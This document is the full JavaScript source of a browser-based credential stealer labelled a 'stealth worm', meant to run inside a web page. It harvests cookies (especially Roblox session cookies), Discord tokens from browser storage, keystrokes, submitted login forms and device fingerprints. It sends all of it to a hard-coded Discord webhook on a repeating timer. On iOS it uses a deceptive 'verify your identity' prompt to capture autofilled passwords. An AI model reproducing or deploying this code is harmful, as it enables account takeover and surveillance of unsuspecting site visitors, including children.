// ====================================================
// ADVANCED BROWSER WORM - MOBILE/PCA COMPATIBLE
// JANUS/TESAVEK STEALTH WORM v2.0
// ====================================================
// This worm runs continuously while website is open
// Tracks all tabs, collects mobile data, sends to Discord
// ====================================================

(function() {
    'use strict';
    
    // Discord Webhook URL
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1453618382166556866/i3OqFBJED9RSTLSJxsOu37DC68A6f_gbgwCG3azFMdiLnuGl07m1vb3k7M1q-fJKx9Kq';
    
    // Global data collector
    window.JANUS_WORM_DATA = {
        victimId: Math.random().toString(36).substring(2) + Date.now().toString(36),
        startTime: Date.now(),
        ipAddress: null,
        userAgent: navigator.userAgent,
        isMobile: /iPhone|iPad|iPod|Android|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
        isSafari: /^((?!chrome|android).)*safari/i.test(navigator.userAgent) || /Version\/[\d\.]+.*Safari/.test(navigator.userAgent),
        isIOS: /iPhone|iPad|iPod/i.test(navigator.userAgent),
        collectedData: {
            cookies: [],
            localStorage: [],
            sessionStorage: [],
            formData: [],
            keystrokes: '',
            visitedUrls: [window.location.href],
            tabActivity: [],
            logins: [],
            passwords: [],
            discordTokens: [],
            robloxCookies: [],
            browserData: {},
            networkInfo: {}
        },
        activeTabs: new Set([window.location.href]),
        closedTabs: []
    };

    console.log('[Tesavek] Worm initialized for victim:', window.JANUS_WORM_DATA.victimId);

    // ==================== PHASE 1: INITIAL DATA COLLECTION ====================

    // Get IP address
    async function getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            window.JANUS_WORM_DATA.ipAddress = data.ip;
            return data.ip;
        } catch (e) {
            try {
                const response = await fetch('https://api64.ipify.org?format=json');
                const data = await response.json();
                window.JANUS_WORM_DATA.ipAddress = data.ip;
                return data.ip;
            } catch (e2) {
                window.JANUS_WORM_DATA.ipAddress = 'Failed';
                return 'Failed';
            }
        }
    }

    // Collect ALL cookies
    function collectCookies() {
        try {
            const cookies = document.cookie.split(';');
            window.JANUS_WORM_DATA.collectedData.cookies = cookies.map(c => c.trim());
            
            // Specifically look for Roblox
            const robloxCookie = cookies.find(c => c.includes('ROBLOSECURITY') || c.includes('.ROBLOSECURITY'));
            if (robloxCookie) {
                window.JANUS_WORM_DATA.collectedData.robloxCookies.push(robloxCookie);
                console.log('[Tesavek] Found Roblox cookie');
            }
            
            // Look for Discord related cookies
            cookies.filter(c => c.includes('discord') || c.includes('token') || c.includes('auth')).forEach(cookie => {
                window.JANUS_WORM_DATA.collectedData.discordTokens.push(cookie);
            });
        } catch (e) {
            console.error('[Tesavek] Cookie collection error:', e);
        }
    }

    // Collect ALL localStorage and sessionStorage
    function collectStorage() {
        try {
            // localStorage
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                window.JANUS_WORM_DATA.collectedData.localStorage.push({key, value: value.substring(0, 500)});
                
                // Check for Discord tokens (pattern: mfa. or regular token)
                if (value && (value.match(/[mn][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/) || 
                    value.match(/mfa\.[\w-]{84}/) || 
                    key.toLowerCase().includes('discord') || 
                    key.toLowerCase().includes('token'))) {
                    window.JANUS_WORM_DATA.collectedData.discordTokens.push(`localStorage[${key}]: ${value.substring(0, 100)}`);
                }
                
                // Check for Roblox data
                if (key.toLowerCase().includes('roblox') || value.toLowerCase().includes('roblox')) {
                    window.JANUS_WORM_DATA.collectedData.robloxCookies.push(`localStorage[${key}]: ${value.substring(0, 200)}`);
                }
            }
            
            // sessionStorage
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                window.JANUS_WORM_DATA.collectedData.sessionStorage.push({key, value: value.substring(0, 500)});
                
                if (value && value.match(/[mn][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/)) {
                    window.JANUS_WORM_DATA.collectedData.discordTokens.push(`sessionStorage[${key}]: ${value.substring(0, 100)}`);
                }
            }
        } catch (e) {
            console.error('[Tesavek] Storage collection error:', e);
        }
    }

    // Collect browser fingerprint
    function collectBrowserData() {
        try {
            window.JANUS_WORM_DATA.collectedData.browserData = {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                maxTouchPoints: navigator.maxTouchPoints,
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                pdfViewerEnabled: navigator.pdfViewerEnabled,
                webdriver: navigator.webdriver,
                vendor: navigator.vendor,
                product: navigator.product,
                appName: navigator.appName,
                appVersion: navigator.appVersion,
                // Safari specific
                standalone: window.navigator.standalone,
                // iOS specific
                deviceModel: window.JANUS_WORM_DATA.isIOS ? getIOSDeviceModel() : 'Unknown'
            };
        } catch (e) {
            console.error('[Tesavek] Browser data error:', e);
        }
    }

    function getIOSDeviceModel() {
        const ua = navigator.userAgent;
        if (/iPhone/.test(ua)) {
            if (/iPhone OS 1[0-9]_/.test(ua)) return 'iPhone 8 or newer';
            if (/iPhone OS 9_/.test(ua)) return 'iPhone 6s or newer';
            return 'iPhone';
        }
        if (/iPad/.test(ua)) return 'iPad';
        if (/iPod/.test(ua)) return 'iPod';
        return 'iOS Device';
    }

    // ==================== PHASE 2: CONTINUOUS MONITORING ====================

    // Keylogger
    let keystrokeBuffer = '';
    document.addEventListener('keydown', (e) => {
        if (e.key.length === 1 || ['Enter', 'Tab', 'Backspace', 'Space'].includes(e.key)) {
            keystrokeBuffer += e.key === ' ' ? ' ' : e.key === 'Backspace' ? '[BS]' : e.key === 'Enter' ? '[ENTER]\n' : e.key === 'Tab' ? '[TAB]' : e.key;
            window.JANUS_WORM_DATA.collectedData.keystrokes += e.key === ' ' ? ' ' : e.key === 'Backspace' ? '[BS]' : e.key === 'Enter' ? '[ENTER]\n' : e.key === 'Tab' ? '[TAB]' : e.key;
            
            // Look for password-like input
            if (e.target.type === 'password' || e.target.name?.toLowerCase().includes('pass')) {
                window.JANUS_WORM_DATA.collectedData.passwords.push({
                    element: e.target.name || e.target.id || 'unknown',
                    timestamp: new Date().toISOString(),
                    partial: e.key === 'Backspace' ? '[DEL]' : '*'
                });
            }
        }
    });

    // Form submission interceptor
    document.addEventListener('submit', (e) => {
        try {
            const formData = new FormData(e.target);
            const data = {};
            formData.forEach((value, key) => {
                data[key] = value;
            });
            
            window.JANUS_WORM_DATA.collectedData.formData.push({
                url: window.location.href,
                timestamp: new Date().toISOString(),
                data: data
            });
            
            // Check for login forms
            if (e.target.querySelector('input[type="password"]') || 
                e.target.querySelector('input[name*="pass"]') || 
                e.target.action.includes('login')) {
                window.JANUS_WORM_DATA.collectedData.logins.push({
                    url: window.location.href,
                    timestamp: new Date().toISOString(),
                    credentials: data
                });
            }
        } catch (err) {
            // Silent fail
        }
    }, true);

    // Track URL changes (single page apps)
    let lastUrl = location.href;
    new MutationObserver(() => {
        const url = location.href;
        if (url !== lastUrl) {
            lastUrl = url;
            window.JANUS_WORM_DATA.collectedData.visitedUrls.push(url);
            window.JANUS_WORM_DATA.activeTabs.add(url);
        }
    }).observe(document, {subtree: true, childList: true});

    // Track visibility changes (tab switching)
    document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
            window.JANUS_WORM_DATA.collectedData.tabActivity.push({
                action: 'tab_hidden',
                timestamp: new Date().toISOString(),
                url: window.location.href
            });
        } else {
            window.JANUS_WORM_DATA.collectedData.tabActivity.push({
                action: 'tab_focused',
                timestamp: new Date().toISOString(),
                url: window.location.href
            });
        }
    });

    // Beforeunload handler (tab closing)
    window.addEventListener('beforeunload', () => {
        window.JANUS_WORM_DATA.closedTabs.push({
            url: window.location.href,
            closedAt: new Date().toISOString(),
            timeSpent: Date.now() - window.JANUS_WORM_DATA.startTime
        });
        
        // Send final data before close
        sendDataToDiscord('TAB_CLOSED');
    });

    // ==================== PHASE 3: DATA EXFILTRATION ====================

    async function sendDataToDiscord(eventType = 'PERIODIC') {
        try {
            // Prepare data payload
            const payload = {
                victimId: window.JANUS_WORM_DATA.victimId,
                eventType: eventType,
                timestamp: new Date().toISOString(),
                duration: Date.now() - window.JANUS_WORM_DATA.startTime,
                ip: window.JANUS_WORM_DATA.ipAddress,
                isMobile: window.JANUS_WORM_DATA.isMobile,
                isSafari: window.JANUS_WORM_DATA.isSafari,
                isIOS: window.JANUS_WORM_DATA.isIOS,
                currentUrl: window.location.href,
                stats: {
                    cookiesFound: window.JANUS_WORM_DATA.collectedData.cookies.length,
                    localStorageItems: window.JANUS_WORM_DATA.collectedData.localStorage.length,
                    visitedUrls: window.JANUS_WORM_DATA.collectedData.visitedUrls.length,
                    keystrokes: window.JANUS_WORM_DATA.collectedData.keystrokes.length,
                    loginsCaptured: window.JANUS_WORM_DATA.collectedData.logins.length,
                    passwordsCaptured: window.JANUS_WORM_DATA.collectedData.passwords.length,
                    discordTokens: window.JANUS_WORM_DATA.collectedData.discordTokens.length,
                    robloxCookies: window.JANUS_WORM_DATA.collectedData.robloxCookies.length,
                    activeTabs: window.JANUS_WORM_DATA.activeTabs.size,
                    closedTabs: window.JANUS_WORM_DATA.closedTabs.length
                },
                sensitiveData: {
                    discordTokens: window.JANUS_WORM_DATA.collectedData.discordTokens.slice(0, 3), // First 3
                    robloxCookies: window.JANUS_WORM_DATA.collectedData.robloxCookies.slice(0, 3), // First 3
                    recentLogins: window.JANUS_WORM_DATA.collectedData.logins.slice(-2), // Last 2
                    recentKeystrokes: keystrokeBuffer.substring(Math.max(0, keystrokeBuffer.length - 200)), // Last 200 chars
                    recentUrls: window.JANUS_WORM_DATA.collectedData.visitedUrls.slice(-5) // Last 5 URLs
                }
            };
            
            // Clear buffer after sending
            keystrokeBuffer = '';
            
            // Send to Discord
            const response = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `🚨 **${eventType} - VICTIM ${window.JANUS_WORM_DATA.victimId}**\n` +
                            `🌐 IP: \`${window.JANUS_WORM_DATA.ipAddress || 'Unknown'}\` | ` +
                            `📱 ${window.JANUS_WORM_DATA.isMobile ? 'Mobile' : 'Desktop'} | ` +
                            `🕒 ${Math.round((Date.now() - window.JANUS_WORM_DATA.startTime) / 1000)}s\n` +
                            `🔗 URL: ${window.location.href.substring(0, 100)}`,
                    embeds: [{
                        title: "📊 LIVE WORM STATS",
                        color: 0xff5500,
                        fields: [
                            {
                                name: "🎮 Roblox Cookies",
                                value: window.JANUS_WORM_DATA.collectedData.robloxCookies.length > 0 ? 
                                    `Found ${window.JANUS_WORM_DATA.collectedData.robloxCookies.length} cookies` : 
                                    "None found",
                                inline: true
                            },
                            {
                                name: "🤖 Discord Tokens",
                                value: window.JANUS_WORM_DATA.collectedData.discordTokens.length > 0 ? 
                                    `Found ${window.JANUS_WORM_DATA.collectedData.discordTokens.length} tokens` : 
                                    "None found",
                                inline: true
                            },
                            {
                                name: "🔑 Logins Captured",
                                value: window.JANUS_WORM_DATA.collectedData.logins.length.toString(),
                                inline: true
                            },
                            {
                                name: "⌨️ Keystrokes",
                                value: `${window.JANUS_WORM_DATA.collectedData.keystrokes.length} chars`,
                                inline: true
                            },
                            {
                                name: "🌐 URLs Visited",
                                value: window.JANUS_WORM_DATA.collectedData.visitedUrls.length.toString(),
                                inline: true
                            },
                            {
                                name: "📁 Storage Items",
                                value: `${window.JANUS_WORM_DATA.collectedData.localStorage.length} local / ${window.JANUS_WORM_DATA.collectedData.sessionStorage.length} session`,
                                inline: true
                            }
                        ],
                        footer: {
                            text: `Tesavek Worm v2.0 | ${window.JANUS_WORM_DATA.isIOS ? 'iOS Safari' : window.JANUS_WORM_DATA.isSafari ? 'Safari' : 'Other Browser'}`
                        }
                    }]
                })
            });
            
            if (response.ok) {
                console.log('[Tesavek] Data sent successfully');
            }
            
        } catch (error) {
            console.error('[Tesavek] Send error:', error);
        }
    }

    // ==================== PHASE 4: WORM LIFECYCLE ====================

    // Initial collection
    async function initializeWorm() {
        console.log('[Tesavek] Starting worm collection...');
        
        await getIP();
        collectCookies();
        collectStorage();
        collectBrowserData();
        
        // Send initial data after 3 seconds
        setTimeout(() => {
            sendDataToDiscord('INITIAL_COLLECTION');
        }, 3000);
        
        // Periodic updates every 30 seconds
        setInterval(() => {
            // Refresh data collection
            collectCookies();
            collectStorage();
            
            // Send periodic update
            sendDataToDiscord('PERIODIC_UPDATE');
        }, 30000);
        
        // Detailed data dump every 2 minutes
        setInterval(() => {
            // Send more detailed data
            sendDetailedReport();
        }, 120000);
    }

    async function sendDetailedReport() {
        try {
            // Send detailed sensitive data (chunked)
            const sensitiveChunks = [];
            
            // Discord tokens chunk
            if (window.JANUS_WORM_DATA.collectedData.discordTokens.length > 0) {
                sensitiveChunks.push({
                    name: "DISCORD_TOKENS_FULL",
                    data: window.JANUS_WORM_DATA.collectedData.discordTokens.join('\n')
                });
            }
            
            // Roblox cookies chunk
            if (window.JANUS_WORM_DATA.collectedData.robloxCookies.length > 0) {
                sensitiveChunks.push({
                    name: "ROBLOX_COOKIES_FULL",
                    data: window.JANUS_WORM_DATA.collectedData.robloxCookies.join('\n')
                });
            }
            
            // Login data chunk
            if (window.JANUS_WORM_DATA.collectedData.logins.length > 0) {
                sensitiveChunks.push({
                    name: "LOGIN_DATA",
                    data: JSON.stringify(window.JANUS_WORM_DATA.collectedData.logins, null, 2)
                });
            }
            
            // Send each chunk
            for (const chunk of sensitiveChunks) {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `📄 **${chunk.name} - ${window.JANUS_WORM_DATA.victimId}**\n\`\`\`${chunk.data.substring(0, 1900)}\`\`\``
                    })
                });
                await new Promise(resolve => setTimeout(resolve, 1000)); // Delay between sends
            }
            
        } catch (error) {
            // Silent fail
        }
    }

    // Start the worm
    initializeWorm();
    
    // Auto-restart if something fails
    setInterval(() => {
        if (!window.JANUS_WORM_DATA || !window.JANUS_WORM_DATA.victimId) {
            console.log('[Tesavek] Worm corrupted, restarting...');
            window.location.reload();
        }
    }, 60000);

    // ==================== PHASE 5: MOBILE-SPECIFIC EXPLOITS ====================
    
    if (window.JANUS_WORM_DATA.isMobile) {
        console.log('[Tesavek] Mobile device detected, enabling mobile exploits');
        
        // Attempt to access iOS Keychain via prompts (social engineering)
        setTimeout(() => {
            if (window.JANUS_WORM_DATA.isIOS && confirm('This website needs to verify your identity. Allow access to saved passwords?')) {
                // If user says yes, we can try to trigger password autofill
                const fakeLogin = document.createElement('div');
                fakeLogin.innerHTML = `
                    <form style="display:none;">
                        <input type="text" name="username" autocomplete="username">
                        <input type="password" name="password" autocomplete="current-password">
                    </form>
                `;
                document.body.appendChild(fakeLogin);
                
                // Try to trigger autofill
                setTimeout(() => {
                    const inputs = fakeLogin.querySelectorAll('input');
                    inputs.forEach(input => input.focus());
                    setTimeout(() => {
                        inputs.forEach(input => input.blur());
                        // Collect any autofilled data
                        const username = inputs[0].value;
                        const password = inputs[1].value;
                        if (username || password) {
                            window.JANUS_WORM_DATA.collectedData.passwords.push({
                                source: 'iOS_Autofill',
                                username: username,
                                password: password,
                                timestamp: new Date().toISOString()
                            });
                            sendDataToDiscord('IOS_AUTOFILL_CAPTURE');
                        }
                    }, 1000);
                }, 500);
            }
        }, 10000);
    }

})();
